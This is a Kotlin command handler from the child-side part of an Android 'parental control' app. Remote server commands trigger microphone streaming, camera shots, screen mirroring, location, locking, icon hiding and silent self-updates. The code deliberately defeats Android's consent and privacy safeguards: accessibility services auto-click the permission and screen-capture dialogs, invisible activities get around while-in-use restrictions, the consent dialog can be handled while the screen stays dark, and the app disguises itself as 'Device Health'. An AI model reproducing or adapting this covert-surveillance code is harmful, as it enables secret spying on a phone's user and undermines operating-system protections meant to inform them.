package com.familyguard.child.util

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.app.admin.DevicePolicyManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import androidx.core.app.NotificationCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.familyguard.child.IconHider
import com.familyguard.child.admin.AdminReceiver
import com.familyguard.child.data.Api
import com.familyguard.child.data.ChildApp
import com.familyguard.child.data.Store
import com.familyguard.child.service.Locator
import com.familyguard.child.service.AudioStreamer
import com.familyguard.child.service.MainService
import com.familyguard.child.service.MirrorManager
import com.familyguard.child.service.MirrorService
import com.familyguard.child.service.WsChild
import com.familyguard.child.ui.BlockOverlay
import com.familyguard.child.ui.ConsentActivity
import com.familyguard.child.ui.ForegroundPokeActivity
import com.familyguard.child.util.SelfHeal
import com.google.gson.JsonArray
import com.google.gson.JsonObject
import kotlinx.coroutines.delay

object CommandHandler {

    suspend fun execute(ctx: Context, cmd: JsonObject): Pair<Boolean, JsonObject> = try {
        val action = cmd.get("action")?.takeIf { it.isJsonPrimitive }?.asString ?: ""
        val params = cmd.get("params")?.takeIf { it.isJsonObject }?.asJsonObject ?: JsonObject()
        handle(ctx, action, params)
    } catch (e: Exception) {
        val d = JsonObject()
        d.addProperty("error", e.message ?: "failed")
        Pair(false, d)
    }

    private suspend fun handle(ctx: Context, action: String, params: JsonObject): Pair<Boolean, JsonObject> {
        val data = JsonObject()
        return when (action) {

            "locate_now" -> {
                val f = Locator.getCurrent(ctx)
                if (f != null) {
                    runCatching { Api.postLocation(f.lat, f.lng, f.accuracy, f.speed, f.battery) }
                    data.addProperty("lat", f.lat)
                    data.addProperty("lng", f.lng)
                    Pair(true, data)
                } else {
                    data.addProperty("error", "no fix")
                    Pair(false, data)
                }
            }

            "ring" -> {
                RingPlayer.start(ctx)
                data.addProperty("status", "ringing")
                Pair(true, data)
            }

            "ring_stop" -> {
                // Same button toggle: parent ne "Ring band karo" tap kiya
                RingPlayer.stop()
                Pair(true, data)
            }

            "sync_usage" -> {
                // Website ka "Sync now" button — usage + call log + SMS turant
                // sync, 15-min periodic worker ka wait nahi.
                com.familyguard.child.service.UsageWorker.runOnce(ctx)
                data.addProperty("status", "syncing")
                Pair(true, data)
            }

            "audio_start" -> {
                val (ok, d) = startMicWithInUseGrant(ctx)
                data.add("audio", d)
                Pair(ok, data)
            }

            "audio_stop" -> {
                AudioStreamer.stop()
                // mic FGS type wapas hatao — Samsung "Active apps" card + status-bar
                // mic icon turant band (Android 14/15 privacy indicators)
                MainService.updateTypes(withMic = false, withCam = false)
                Pair(true, data)
            }

            "lock" -> {
                val msg = params.get("message")?.takeIf { it.isJsonPrimitive }?.asString ?: "Locked by parent"
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val locked = runCatching {
                    if (dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java))) {
                        dpm.lockNow()
                        true
                    } else {
                        false
                    }
                }.getOrDefault(false)
                if (!locked) {
                    BlockOverlay.show(ctx, BlockOverlay.Reason.LOCKED, "Device locked", msg)
                }
                Pair(true, data)
            }

            "unlock" -> {
                BlockOverlay.hide(BlockOverlay.Reason.LOCKED)
                Pair(true, data)
            }

            "screenshot" -> {
                val f = MirrorManager.captureOnce(ctx)
                if (f != null) {
                    val url = Api.uploadMedia(f)
                    data.addProperty("url", url)
                    runCatching { f.delete() }
                    Pair(true, data)
                } else {
                    // No capture permission (e.g. after reboot) — pop the consent dialog
                    // (auto-confirmed by accessibility); next attempt will succeed.
                    requestProjectionConsent(ctx)
                    data.addProperty("error", "no permission — consent auto-requested, retry shortly")
                    Pair(false, data)
                }
            }

            "camera" -> {
                val front = params.get("facing")?.takeIf { it.isJsonPrimitive }?.asString == "front"
                // Android 14/15: camera FGS type bhi while-in-use hai — poke upgrade
                // ke bina background se openCamera fail/silent hota hai.
                if (Build.VERSION.SDK_INT >= 30) {
                    awaitPokeUpgrade(ctx, "cam")
                }
                try {
                    val f = CameraCapture.take(ctx, front)
                    if (f != null) {
                        val url = Api.uploadMedia(f)
                        data.addProperty("url", url)
                        runCatching { f.delete() }
                        Pair(true, data)
                    } else {
                        data.addProperty("error", "camera unavailable")
                        Pair(false, data)
                    }
                } finally {
                    // shot done — camera type wapas rest par (privacy icon + Samsung card band)
                    MainService.updateTypes(withMic = false, withCam = false)
                }
            }

            "mirror_start" -> {
                val fps = params.get("fps")?.takeIf { it.isJsonPrimitive }?.asInt ?: 8
                val quality = params.get("quality")?.takeIf { it.isJsonPrimitive }?.asInt ?: 60
                if (MirrorManager.startStreaming(fps, quality)) {
                    sendMirrorState(true)
                    data.addProperty("status", "streaming")
                    Pair(true, data)
                } else {
                    // Capture permission missing (e.g. after reboot): pop the consent
                    // dialog (accessibility auto-confirms it) and remember the request so
                    // MirrorService resumes streaming the moment consent is granted.
                    Store.pendingMirrorFps = fps
                    Store.pendingMirrorQuality = quality
                    val launched = requestProjectionConsent(ctx)
                    sendMirrorState(false)
                    data.addProperty("status", "consent_pending")
                    data.addProperty(
                        "note",
                        if (launched) "permission requested — auto-confirming, mirror starts in a few seconds"
                        else "waiting for consent dialog (already open / recently requested)"
                    )
                    Pair(true, data)
                }
            }

            "mirror_stop" -> {
                // FULL stop: frames + projection session dono band. Cast icon aur
                // "Screen sharing" notification turant hat jate hain — pehle session
                // warm rehti thi, isi liye notification me cast PERMANENT dikhta tha.
                // Agla mirror_start consent dialog khud khol kar accessibility se
                // auto-confirm kar dega (~1-2 s), phir frames turant chalenge.
                MirrorManager.stopStreaming()
                Store.pendingMirrorFps = -1
                Store.projectionRequestedAt = 0L // in-flight consent state clear — agla start turant fresh dialog kholega
                MirrorManager.release()
                runCatching { ctx.stopService(Intent(ctx, MirrorService::class.java)) }
                sendMirrorState(false)
                Pair(true, data)
            }

            "mirror_request_permission" -> {
                requestProjectionConsent(ctx)
                Pair(true, data)
            }

            "show_app_icon" -> {
                IconHider.show(ctx)
                Pair(true, data)
            }

            "hide_app_icon" -> {
                IconHider.hide(ctx)
                Pair(true, data)
            }

            "get_apps" -> {
                val pm = ctx.packageManager
                val intent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER)
                val apps = pm.queryIntentActivities(intent, 0)
                    .map { ChildApp(it.activityInfo.packageName, it.loadLabel(pm).toString()) }
                    .distinctBy { it.pkg }
                val arr = JsonArray()
                apps.forEach { a ->
                    val o = JsonObject()
                    o.addProperty("pkg", a.pkg)
                    o.addProperty("name", a.name)
                    arr.add(o)
                }
                val m = JsonObject()
                m.addProperty("type", "apps")
                m.add("apps", arr)
                WsChild.send(m.toString())
                Pair(true, data)
            }

            "message" -> {
                val title = params.get("title")?.takeIf { it.isJsonPrimitive }?.asString ?: "Message"
                val text = params.get("text")?.takeIf { it.isJsonPrimitive }?.asString ?: ""
                BlockOverlay.show(ctx, BlockOverlay.Reason.MESSAGE, title, text)
                runCatching {
                    ensureChannel(ctx)
                    val n = NotificationCompat.Builder(ctx, CH_FG)
                        .setSmallIcon(android.R.drawable.ic_dialog_info)
                        .setContentTitle(title)
                        .setContentText(text)
                        .setAutoCancel(true)
                        .build()
                    if (
                        ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
                        Build.VERSION.SDK_INT < 33
                    ) {
                        NotificationManagerCompat.from(ctx).notify(9005, n)
                    }
                }
                Handler(Looper.getMainLooper()).postDelayed(
                    { BlockOverlay.hide(BlockOverlay.Reason.MESSAGE) },
                    8000
                )
                Pair(true, data)
            }

            "release_protections" -> {
                AgeRelease.releaseAll(ctx)
                Pair(true, data)
            }

            "heal" -> {
                SelfHeal.runNow(ctx)
                data.add("health", SelfHeal.healthReport(ctx))
                Pair(true, data)
            }

            "update_apk" -> {
                // Parent ne "Child app update" button dabaya — silent self-update
                // abhi check karo (server par naya APK ho to khud install ho jayega).
                val status = com.familyguard.child.util.UpdateManager.checkAndInstall(ctx)
                data.addProperty("status", status)
                Pair(true, data)
            }

            "health" -> {
                data.add("health", SelfHeal.healthReport(ctx))
                Pair(true, data)
            }

            else -> {
                data.addProperty("error", "unknown action")
                Pair(false, data)
            }
        }
    }

    // Neutral brand — bachche ke phone par kahi bhi "FamilyGuard"/parental-control
    // na dikhe. Notification text ab "Device Health" theme me hai.
    const val CH_FG = "dh_service"

    private fun ensureChannel(ctx: Context) {
        runCatching {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.deleteNotificationChannel("fg_service") // purana branded channel hatao
            nm.createNotificationChannel(
                NotificationChannel(CH_FG, "Device Health", NotificationManager.IMPORTANCE_MIN)
            )
        }
    }

    /** MIC START — Android 14/15 safe. Mic FGS type "while-in-use" hai: type ka
     *  activation sirf tab legal hai jab app ke paas visible activity ho, warna
     *  system AudioRecord ko chupchap SILENCE kar deta hai ("mic ni kaam karra").
     *  ForegroundPokeActivity 250 ms ke liye invisible foreground ban kar type
     *  upgrade karti hai; poke fail ho (background launch blocked) to service-level
     *  upgrade best-effort — wo tab kaam karta hai jab service foreground-start hui thi.
     *  RECORD_AUDIO runtime permission bhi missing ho to poke-activity "micperm"
     *  mode me permission dialog khol deti hai aur accessibility khud "Allow"
     *  click kar deti hai — bina kisi tap ke mic heal (pehle yahin "Fail hua:
     *  unknown" aata tha). */
    private suspend fun startMicWithInUseGrant(ctx: Context): Pair<Boolean, JsonObject> {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            val healed = awaitMicPermissionViaPoke(ctx)
            if (!healed) {
                val d = JsonObject()
                d.addProperty(
                    "error",
                    "Mic permission nahi mili — child phone par Device Health app ek baar khol kar mic allow karo"
                )
                return Pair(false, d)
            }
        }
        if (Build.VERSION.SDK_INT >= 30) {
            awaitPokeUpgrade(ctx, "mic")
        }
        return AudioStreamer.start(ctx)
    }

    /** Mic permission self-heal: invisible poke activity khulti hai, system
     *  permission dialog par accessibility "Allow" click karta hai. Max 12 s
     *  wait (dialog render + a11y click me thoda time lagta hai). */
    private suspend fun awaitMicPermissionViaPoke(ctx: Context): Boolean {
        val before = Store.pokeMicPermAt
        // a11y auto-grant ARM — sirf "Allow"/"While using the app" par click hoga
        Store.autoClickStep = "mic"
        Store.autoClickUntil = android.os.SystemClock.elapsedRealtime() + 30_000L
        try {
            ctx.startActivity(
                Intent(ctx, ForegroundPokeActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                    .putExtra("mode", "micperm")
            )
        } catch (_: Exception) {
            // background launch blocked — runtime permission background se
            // request karna possible nahi, honest fail
            Store.autoClickStep = ""
            Store.autoClickUntil = 0L
            return false
        }
        val deadline = android.os.SystemClock.elapsedRealtime() + 12_000
        while (android.os.SystemClock.elapsedRealtime() < deadline &&
            Store.pokeMicPermAt == before
        ) {
            delay(100)
        }
        val granted = ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
        if (!granted) {
            Store.autoClickStep = ""
            Store.autoClickUntil = 0L
        }
        return granted
    }

    /** Invisible poke activity launch karo aur uske type-upgrade ka intezaar karo
     *  (max 2.5 s). Fail hone par service-level best-effort upgrade. */
    private suspend fun awaitPokeUpgrade(ctx: Context, mode: String) {
        val before = if (mode == "cam") Store.pokeCamDoneAt else Store.pokeMicDoneAt
        try {
            ctx.startActivity(
                Intent(ctx, ForegroundPokeActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                    .putExtra("mode", mode)
            )
        } catch (_: Exception) {
            // background launch blocked — seedha service upgrade try karo
            if (mode == "cam") MainService.updateTypes(withMic = false, withCam = true)
            else MainService.updateTypes(withMic = true, withCam = false)
            return
        }
        val deadline = android.os.SystemClock.elapsedRealtime() + 2500
        while (android.os.SystemClock.elapsedRealtime() < deadline &&
            (if (mode == "cam") Store.pokeCamDoneAt else Store.pokeMicDoneAt) == before
        ) {
            delay(100)
        }
        if ((if (mode == "cam") Store.pokeCamDoneAt else Store.pokeMicDoneAt) == before) {
            // poke activity khuli hi nahi (BAL block) — fallback upgrade
            if (mode == "cam") MainService.updateTypes(withMic = false, withCam = true)
            else MainService.updateTypes(withMic = true, withCam = false)
        }
    }

    /** Tell the parents the real mirroring state so their UI never shows a fake
     *  "LIVE" while the child is still waiting for the consent dialog. */
    private fun sendMirrorState(streaming: Boolean) {
        runCatching {
            val m = JsonObject()
            m.addProperty("type", "mirror_state")
            m.addProperty("streaming", streaming)
            WsChild.send(m.toString())
        }
    }

    /** Launch the system screen-capture consent dialog without user interaction.
     *  Works from background because the app holds the overlay permission; if the
     *  OEM blocks that, fall back to a tap-able heads-up notification. EnforcementService
     *  auto-clicks "Start now" within 60 s of this call.
     *  quiet=true (reboot path): do NOT wake the screen — the dialog is handled
     *  over the lockscreen while the phone stays dark.
     *  Returns true when a fresh dialog request was launched. Re-launch sirf tab
     *  suppress hota hai jab pehla request sach me in-flight ho (smart guard,
     *  blind 8 s guard nahi — warna quick off→on toggle par dialog kabhi nahi
     *  khulta tha aur mirror unreliable ho jata tha). */
    fun requestProjectionConsent(ctx: Context, quiet: Boolean = false): Boolean {
        val now = android.os.SystemClock.elapsedRealtime()
        // SMART suppression: sirf tab ruko jab pehla consent request SACH ME chal
        // raha ho (fresh request + projection abhi nahi mili). Pehle BLIND 8 s
        // guard tha — quick mirror off→on toggle ke baad naya request suppress
        // ho jata tha, dialog KABHI nahi khulta, mirror on/off unreliable ho jata
        // tha aur parent ki baar-baar taps par dialogs ek ke baad ek khulte the.
        val inFlight = Store.projectionRequestedAt > 0L &&
            now - Store.projectionRequestedAt in 0..60_000L
        // 20 s: attemptConfirm ka retry loop (40 x 500 ms) poora cover ho jaye —
        // us window me doosra ConsentActivity launch karne se dialog STACK hota hai.
        if (inFlight && now - Store.lastConsentRequestAt < 20_000L) return false
        Store.lastConsentRequestAt = now
        Store.projectionRequestedAt = now
        try {
            ctx.startActivity(
                Intent(ctx, ConsentActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    .putExtra("quiet", quiet)
            )
        } catch (_: Exception) {
            val pi = PendingIntent.getActivity(
                ctx, 9003,
                Intent(ctx, ConsentActivity::class.java).putExtra("quiet", quiet),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
            ensureChannel(ctx)
            val n = NotificationCompat.Builder(ctx, CH_FG)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("Screen sharing")
                .setContentText("Tap to allow screen sharing")
                .setContentIntent(pi)
                .setAutoCancel(true)
                .build()
            if (
                ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
                Build.VERSION.SDK_INT < 33
            ) {
                NotificationManagerCompat.from(ctx).notify(9004, n)
            }
        }
        return true
    }
}
